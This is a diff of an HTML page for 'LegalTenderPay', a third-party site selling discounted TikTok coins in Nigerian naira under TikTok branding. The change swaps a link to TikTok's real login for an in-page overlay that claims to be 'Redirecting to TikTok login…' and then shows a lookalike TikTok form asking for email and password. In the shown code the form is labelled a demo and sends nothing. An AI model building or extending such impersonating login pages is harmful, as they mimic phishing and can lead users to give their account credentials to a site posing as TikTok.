@@ -1,390 +1,253 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
 <title>LegalTenderPay</title>
-
 <style>
-body {
-  font-family: 'Arial', sans-serif;
-  background-color: #fff;
-  margin: 0;
-  padding: 0;
-  color: #000;
-}
+  /* ---------- Base ---------- */
+  body { font-family: Arial, sans-serif; background:#fff; margin:0; color:#000; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale; }
+  .container { max-width:420px; margin:0 auto; padding:15px 20px 60px; }
 
-/* Secure payment */
-.secure-payment {
-  background-color: #e8f8ed;
-  text-align: center;
-  padding: 12px;
-  font-size: 15px;
-  color: #006b3f;
-  font-weight: 600;
-}
+  .secure-payment {
+    background:#e8f8ed; color:#006b3f; font-weight:600;
+    text-align:center; padding:12px; font-size:15px;
+  }
 
-/* Layout */
-.container {
-  max-width: 420px;
-  margin: 0 auto;
-  padding: 15px 20px 20px 20px;
-}
+  h1 { font-size:26px; margin:12px 0; font-weight:700; }
+  .sub-text { color:#333; font-weight:600; margin-bottom:18px; line-height:1.3; }
+  .sub-text span { color:#ff355e; font-weight:700; }
 
-/* Header */
-.header {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin-bottom: 0;
-  margin-top: -15px;
-}
+  .coins-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin-bottom:20px; }
+  .coin-box { background:#f8f8f8; border-radius:10px; text-align:center; padding:15px 5px; border:1px solid #f0f0f0; cursor:pointer; transition:all .18s; }
+  .coin-box.active { border-color:#ffadc4; background:#fff6f9; transform:translateY(-2px); }
 
-.header h1 {
-  margin: 0;
-  font-size: 26px;
-  font-weight: bold;
-}
+  .coin-amount { font-weight:700; font-size:18px; display:inline-flex; align-items:center; gap:6px; }
+  .coin-amount img { width:20px; height:20px; }
 
-/* TikTok logo on header */
-.header-right {
-  display: flex;
-  justify-content: flex-end;
-  align-items: center;
-  margin-right: -160px;
-  margin-top: 20px;
-}
+  .login-btn {
+    background:#ff375f; color:white; border:none; width:100%; padding:15px; border-radius:8px; font-size:16px; font-weight:700; cursor:pointer; margin-bottom:18px;
+  }
 
-.tiktok-mini-logo {
-  width: 230px;
-  height: auto;
-  opacity: 0.95;
-  transition: 0.3s ease;
-}
+  .invite-box { display:flex; align-items:center; justify-content:space-between; background:#fff; border-radius:10px; padding:12px; box-shadow:0 1px 3px rgba(0,0,0,0.07); margin-bottom:15px; }
+  .invite-left { display:flex; align-items:center; gap:10px; }
+  .invite-left img { width:35px; }
+  .share-btn { font-size:22px; color:#999; cursor:pointer; }
 
-.tiktok-mini-logo:hover {
-  transform: scale(1.08);
-}
+  .coin-image-section { text-align:center; margin-top:25px; }
+  .coin-image-section img { width:240px; height:auto; border-radius:12px; }
 
-/* Sub text */
-.sub-text {
-  font-size: 16px;
-  color: #333;
-  font-weight: 600;
-  margin-top: -12px;
-  margin-bottom: 18px;
-  line-height: 1.3;
-}
+  .tiktok-logo-section { text-align:center; margin-top:10px; opacity:.3; }
+  .footer { text-align:center; margin-top:90px; opacity:.6; font-weight:700; }
 
-.sub-text span {
-  color: #ff355e;
-  font-weight: 700;
-}
+  /* copy popup */
+  .copy-popup { position:fixed; bottom:25px; left:50%; transform:translateX(-50%); background:#000; color:#fff; padding:12px 18px; border-radius:8px; opacity:0; transition:opacity .25s; z-index:9999; }
+  .copy-popup.show { opacity:0.95; }
 
-/* Coin grid */
-.coins-grid {
-  display: grid;
-  grid-template-columns: repeat(3, 1fr);
-  gap: 10px;
-  margin-bottom: 25px;
-}
+  /* ---------- Login overlay / mock UI ---------- */
+  .overlay {
+    display:none; /* toggled by JS */
+    position:fixed;
+    left:0; top:0; right:0; bottom:0;
+    background:rgba(255,255,255,0.98);
+    z-index:9999;
+    align-items:center;
+    justify-content:center;
+    flex-direction:column;
+    gap:18px;
+    padding:18px;
+  }
 
-.coin-box {
-  background-color: #f8f8f8;
-  border-radius: 10px;
-  text-align: center;
-  padding: 15px 5px;
-  cursor: pointer;
-  transition: 0.3s;
-  border: 1px solid #f0f0f0;
-  text-decoration: none;
-  color: inherit;
-}
+  /* TikTok-style small spinner */
+  .spinner {
+    width:64px; height:64px; display:flex; align-items:center; justify-content:center;
+  }
+  .dot {
+    width:12px; height:12px; border-radius:50%;
+    animation: pulse 800ms ease-in-out infinite;
+  }
+  .dot.left { background:#00c6ff; margin-right:6px; animation-delay:0ms; }
+  .dot.right { background:#ff2b6d; margin-left:6px; animation-delay:200ms; }
+  @keyframes pulse {
+    0% { transform: scale(.85); opacity:.7; }
+    50% { transform: scale(1.1); opacity:1; }
+    100% { transform: scale(.85); opacity:.7; }
+  }
 
-.coin-box:hover {
-  background-color: #f0f0f0;
-}
+  /* mock login panel */
+  .mock-login {
+    width:320px; max-width:92%;
+    background:#fff; border-radius:14px; box-shadow:0 12px 30px rgba(0,0,0,0.08);
+    border:1px solid #eee; padding:16px; text-align:left;
+  }
+  .mock-login .row { margin-bottom:10px; }
+  .mock-login h3 { margin:0 0 8px; font-size:18px; }
+  .field { background:#fafafa; border-radius:8px; padding:10px; color:#999; }
+  .login-primary { margin-top:8px; background:#ededed; border-radius:8px; padding:10px; text-align:center; font-weight:700; color:#888; }
+  .login-small { font-size:13px; color:#666; margin-top:8px; text-align:center; }
 
-.coin-box.active {
-  border: 2px solid #ffadc4;
-  background-color: #fff6f9;
-}
+  .close-mock {
+    position:absolute; right:12px; top:12px; background:transparent; border:none; font-size:20px; cursor:pointer; color:#999;
+  }
 
-.coin-amount {
-  font-weight: 700;
-  font-size: 18px;
-  display: inline-flex;
-  align-items: center;
-  justify-content: center;
-  gap: 5px;
-}
+  /* for demo "login" form that looks active after clicking "Log in" mock */
+  .input-real { border:1px solid #e6e6e6; padding:10px; border-radius:8px; width:100%; box-sizing:border-box; margin-bottom:10px; }
+  .real-btn { background:#ff375f; color:#fff; padding:10px; border-radius:8px; border:none; width:100%; font-weight:700; cursor:pointer; }
 
-.coin-amount img {
-  width: 20px;
-  height: 20px;
-}
-
-.coin-price {
-  color: #666;
-  font-size: 14px;
-  margin-top: 3px;
-}
-
-/* Button */
-.login-btn {
-  background-color: #ff375f;
-  color: white;
-  border: none;
-  width: 100%;
-  padding: 15px;
-  border-radius: 8px;
-  font-size: 16px;
-  font-weight: bold;
-  cursor: pointer;
-  margin-bottom: 25px;
-}
-
-/* Invite & Share */
-.invite-box {
-  background-color: #fff;
-  border-radius: 10px;
-  padding: 15px;
-  box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  margin-bottom: 15px;
-}
-
-.invite-left {
-  display: flex;
-  align-items: center;
-}
-
-.invite-left img {
-  width: 35px;
-  margin-right: 10px;
-}
-
-.invite-text {
-  font-size: 16px;
-  font-weight: 600;
-}
-
-.invite-sub {
-  color: #666;
-  font-size: 13px;
-}
-
-.share-btn {
-  font-size: 22px;
-  color: #999;
-  cursor: pointer;
-  transition: 0.2s;
-}
-
-.share-btn:hover {
-  color: #000;
-  transform: scale(1.1);
-}
-
-/* Coin Image Section */
-.coin-image-section {
-  text-align: center;
-  margin-top: 25px;
-}
-
-.coin-image-section img {
-  width: 240px;
-  height: auto;
-  border-radius: 12px;
-  transition: 0.3s ease;
-}
-
-.coin-image-section img:hover {
-  transform: scale(1.05);
-}
-
-/* TikTok logo centered below Invite box */
-.tiktok-logo-section {
-  text-align: center;
-  margin-top: 10px;
-  opacity: 0.3;
-}
-
-.tiktok-logo-section img {
-  width: 60px;
-  height: auto;
-}
-
-/* Footer */
-.footer {
-  text-align: center;
-  margin-top: 100px;
-  opacity: 0.6;
-}
-
-.footer .legal {
-  font-size: 18px;
-  font-weight: bold;
-  opacity: 0.8;
-}
-
-/* Popup */
-.copy-popup {
-  position: fixed;
-  bottom: 25px;
-  left: 50%;
-  transform: translateX(-50%);
-  background: #000;
-  color: #fff;
-  padding: 12px 20px;
-  border-radius: 8px;
-  font-size: 15px;
-  opacity: 0;
-  transition: opacity 0.3s ease;
-  z-index: 999;
-}
-
-.copy-popup.show {
-  opacity: 0.9;
-}
+  @media (max-width:420px) {
+    .coin-image-section img { width:210px; }
+    .mock-login { width:92%; }
+  }
 </style>
 </head>
-
 <body>
 
-<div class="secure-payment">
-  Secure Payment via LegalTenderPay
-</div>
+  <div class="secure-payment">Secure Payment via LegalTenderPay</div>
 
-<div class="container">
-  <div class="header">
-    <h1>Get Coins</h1>
-    <div class="header-right">
-      <img class="tiktok-mini-logo" src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
-    </div>
-  </div>
-
-  <p class="sub-text">
-    Save around <span>25%</span> with a lower<br>
-    third-party service fee.
-  </p>
-
-  <div class="coins-grid">
-    <div class="coin-box" onclick="selectBox(this)">
-      <div class="coin-amount">
-        <img src="https://cdn-icons-png.flaticon.com/512/138/138281.png" alt="coin"> 30
-      </div>
-      <div class="coin-price">NGN530</div>
-    </div>
-
-    <div class="coin-box" onclick="selectBox(this)">
-      <div class="coin-amount">
-        <img src="https://cdn-icons-png.flaticon.com/512/138/138281.png" alt="coin"> 350
-      </div>
-      <div class="coin-price">NGN6,200</div>
-    </div>
-
-    <div class="coin-box" onclick="selectBox(this)">
-      <div class="coin-amount">
-        <img src="https://cdn-icons-png.flaticon.com/512/138/138281.png" alt="coin"> 700
-      </div>
-      <div class="coin-price">NGN12,400</div>
-    </div>
-
-    <div class="coin-box" onclick="selectBox(this)">
-      <div class="coin-amount">
-        <img src="https://cdn-icons-png.flaticon.com/512/138/138281.png" alt="coin"> 1,400
-      </div>
-      <div class="coin-price">NGN24,700</div>
-    </div>
-
-    <div class="coin-box" onclick="selectBox(this)">
-      <div class="coin-amount">
-        <img src="https://cdn-icons-png.flaticon.com/512/138/138281.png" alt="coin"> 3,500
-      </div>
-      <div class="coin-price">NGN61,600</div>
-    </div>
-
-    <div class="coin-box" onclick="selectBox(this)">
-      <span class="coin-amount">Custom</span>
-    </div>
-  </div>
-
-  <button class="login-btn" onclick="loginToTikTok()">Log in to get Coins</button>
-
-  <div class="invite-box">
-    <div class="invite-left">
-      <img src="https://cdn-icons-png.flaticon.com/512/12749/12749038.png" alt="invite">
-      <div>
-        <div class="invite-text">Invite & Get Rewards</div>
-        <div class="invite-sub">Check out this new feature!</div>
+  <div class="container">
+    <div class="header">
+      <h1>Get Coins</h1>
+      <div class="header-right">
+        <img class="tiktok-mini-logo" src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo" style="width:84px;">
       </div>
     </div>
-    <span class="share-btn" onclick="doShare()">&#62;</span>
+
+    <p class="sub-text">Save around <span>25%</span> with a lower<br> third-party service fee.</p>
+
+    <div class="coins-grid">
+      <div class="coin-box" onclick="selectBox(this)"><div class="coin-amount"> <img src="https://cdn-icons-png.flaticon.com/512/138/138281.png" alt="">30</div><div class="coin-price">NGN530</div></div>
+      <div class="coin-box" onclick="selectBox(this)"><div class="coin-amount"> <img src="https://cdn-icons-png.flaticon.com/512/138/138281.png" alt="">350</div><div class="coin-price">NGN6,200</div></div>
+      <div class="coin-box" onclick="selectBox(this)"><div class="coin-amount"> <img src="https://cdn-icons-png.flaticon.com/512/138/138281.png" alt="">700</div><div class="coin-price">NGN12,400</div></div>
+
+      <div class="coin-box" onclick="selectBox(this)"><div class="coin-amount"> <img src="https://cdn-icons-png.flaticon.com/512/138/138281.png" alt="">1,400</div><div class="coin-price">NGN24,700</div></div>
+      <div class="coin-box" onclick="selectBox(this)"><div class="coin-amount"> <img src="https://cdn-icons-png.flaticon.com/512/138/138281.png" alt="">3,500</div><div class="coin-price">NGN61,600</div></div>
+      <div class="coin-box" onclick="selectBox(this)"><div class="coin-amount">Custom</div></div>
+    </div>
+
+    <button class="login-btn" id="loginBtn">Log in to get Coins</button>
+
+    <div class="invite-box">
+      <div class="invite-left">
+        <img src="https://cdn-icons-png.flaticon.com/512/12749/12749038.png" alt="">
+        <div>
+          <div class="invite-text">Invite & Get Rewards</div>
+          <div class="invite-sub">Check out this new feature!</div>
+        </div>
+      </div>
+      <span class="share-btn" id="openShare">&#62;</span>
+    </div>
+
+    <div class="coin-image-section">
+      <img src="https://raw.githubusercontent.com/LegalTenderPay/LegalTenderPaySite/refs/heads/main/70a854a7-f718-447f-9176-6ea7a74ff63e.jpeg" alt="LegalTenderPay Coin">
+    </div>
+
+    <div class="tiktok-logo-section">
+      <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok" style="width:60px;">
+    </div>
+
+    <div class="footer"><div class="legal">LegalTenderPay</div></div>
   </div>
 
-  <div class="coin-image-section">
-    <img src="https://raw.githubusercontent.com/LegalTenderPay/LegalTenderPaySite/refs/heads/main/70a854a7-f718-447f-9176-6ea7a74ff63e.jpeg" alt="LegalTenderPay Coin">
-  </div>
+  <!-- copy popup -->
+  <div id="copyPopup" class="copy-popup">Link copied! Share it manually 💬</div>
 
-  <div class="tiktok-logo-section">
-    <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
-  </div>
+  <!-- overlay that shows spinner then mock login (all inside your page) -->
+  <div id="overlay" class="overlay" role="dialog" aria-modal="true" aria-hidden="true" style="display:none;">
 
-  <div class="footer">
-    <div class="legal">LegalTenderPay</div>
-  </div>
-</div>
+    <!-- Spinner + message -->
+    <div style="display:flex;flex-direction:column;align-items:center;gap:12px;">
+      <div class="spinner" aria-hidden="true">
+        <div class="dot left"></div>
+        <div class="dot right"></div>
+      </div>
+      <div style="font-weight:600;color:#333;">Redirecting to TikTok login…</div>
+    </div>
 
-<div class="copy-popup" id="copyPopup">Link copied! Share it manually 💬</div>
+    <!-- mock login panel shown AFTER spinner -->
+    <div id="mockPanel" class="mock-login" style="display:none; position:relative;">
+      <button id="closeMock" class="close-mock" aria-label="Close">✖</button>
+      <h3>Log in</h3>
+      <div class="row">
+        <div class="field">Email or username</div>
+      </div>
+      <div class="row">
+        <div class="field">Password</div>
+      </div>
+      <div class="login-primary">Forgot password?</div>
+      <div class="login-small">This is a demo login inside the page. After real login you'll be returned to the site.</div>
+
+      <!-- Optional: a simulated working form (not connected to TikTok) -->
+      <hr style="margin:12px 0;border:none;border-top:1px solid #f1f1f1;">
+      <div style="font-size:13px;color:#555;margin-bottom:8px;">Demo form (only for look)</div>
+      <input id="demoEmail" class="input-real" placeholder="Email or username" />
+      <input id="demoPass" type="password" class="input-real" placeholder="Password" />
+      <button id="demoLoginBtn" class="real-btn">Log in</button>
+    </div>
+  </div>
 
 <script>
-function selectBox(element) {
-  const boxes = document.querySelectorAll('.coin-box');
-  boxes.forEach(box => box.classList.remove('active'));
-  element.classList.add('active');
-}
-
-// Opens TikTok login page in new tab, auto return simulation
-function loginToTikTok() {
-  const loginTab = window.open("https://www.tiktok.com/login/phone-or-email/email", "_blank");
-
-  // Check every second if the user has closed the login tab, then redirect back
-  const checkLogin = setInterval(() => {
-    if (loginTab.closed) {
-      clearInterval(checkLogin);
-      window.location.href = "https://legaltenderpay.github.io/LegalTenderPaySite/#";
-    }
-  }, 1000);
-}
-
-// Share button function
-function doShare() {
-  const shareData = {
-    title: "LegalTenderPay 🏆",
-    text: "Buy TikTok & Crypto coins securely and earn rewards 💰",
-    url: "https://legaltenderpay.github.io/LegalTenderPaySite/"
-  };
-
-  if (navigator.share) {
-    navigator.share(shareData)
-      .then(() => console.log('✅ Shared successfully!'))
-      .catch(err => console.log('❌ Share failed:', err));
-  } else {
-    const tempInput = document.createElement("input");
-    tempInput.value = shareData.text + " " + shareData.url;
-    document.body.appendChild(tempInput);
-    tempInput.select();
-    document.execCommand("copy");
-    document.body.removeChild(tempInput);
-
-    const popup = document.getElementById("copyPopup");
-    popup.classList.add("show");
-    setTimeout(() => popup.classList.remove("show"), 2500);
+  // helpers
+  function selectBox(el){
+    document.querySelectorAll('.coin-box').forEach(b => b.classList.remove('active'));
+    el.classList.add('active');
   }
-}
+
+  // overlay elements
+  const overlay = document.getElementById('overlay');
+  const mockPanel = document.getElementById('mockPanel');
+  const loginBtn = document.getElementById('loginBtn');
+  const closeMock = document.getElementById('closeMock');
+  const copyPopup = document.getElementById('copyPopup');
+  const demoLoginBtn = document.getElementById('demoLoginBtn');
+
+  // When user clicks "Log in to get Coins" show spinner then mock login panel
+  loginBtn.addEventListener('click', () => {
+    // show overlay and spinner
+    overlay.style.display = 'flex';
+    overlay.setAttribute('aria-hidden', 'false');
+    mockPanel.style.display = 'none';
+
+    // show spinner for ~2s to mimic redirect & loading
+    setTimeout(() => {
+      // hide spinner, show mock login panel inside the overlay
+      mockPanel.style.display = 'block';
+    }, 2000);
+  });
+
+  // close mock login and hide overlay
+  closeMock.addEventListener('click', () => {
+    mockPanel.style.display = 'none';
+    overlay.style.display = 'none';
+    overlay.setAttribute('aria-hidden', 'true');
+  });
+
+  // demo login button — simulate successful login and "return" to page (close overlay)
+  demoLoginBtn.addEventListener('click', () => {
+    // For demo purposes: show temporary "logged in" state then hide overlay
+    demoLoginBtn.textContent = 'Logging in…';
+    demoLoginBtn.disabled = true;
+    setTimeout(() => {
+      demoLoginBtn.textContent = 'Logged in ✓';
+      // hide overlay and return user to main UI
+      setTimeout(()=> {
+        mockPanel.style.display = 'none';
+        overlay.style.display = 'none';
+        overlay.setAttribute('aria-hidden', 'true');
+        demoLoginBtn.textContent = 'Log in';
+        demoLoginBtn.disabled = false;
+        alert('Demo: you are now returned to the site. Continue the purchase flow.');
+      }, 700);
+    }, 1200);
+  });
+
+  // small accessibility: close overlay when user presses Escape
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape' && overlay.style.display === 'flex') {
+      mockPanel.style.display = 'none';
+      overlay.style.display = 'none';
+      overlay.setAttribute('aria-hidden', 'true');
+    }
+  });
 </script>
 
 </body>
